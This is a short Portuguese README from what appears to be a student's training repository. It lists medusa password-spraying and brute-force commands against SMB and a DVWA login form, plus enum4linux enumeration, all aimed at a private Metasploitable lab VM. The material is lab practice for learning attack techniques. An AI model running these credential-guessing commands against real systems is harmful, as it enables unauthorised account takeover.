# Brute-force-simulator
Repositório contendo alguns comandos e arquivos utilizados para invadir um sistema simulado utilizando brute force

medusa  -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt  -M smbnt -t 2 -T 50 

echo -e "user\nhmsfadm\nhadm\nmadm\nroot" > users.txt 


medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&login=Login' \
-m 'FAIL=Login failed' -t 6

enum4linux -o 192.168.56.102 | tee enum_output.txt

less enum4_output.txt 

alguns são comandos de criação de wordlist e de senhas que utilizei, outros servem para invadir tentando esses mesmos arquivos criados
utilizei e testei todos os comandos mostrado no curso e simulei um ataque de cadeia utilizando o primeiro comando citado no arquivo
o ambiente que utilizei foi o ambiente controlado metasploitable
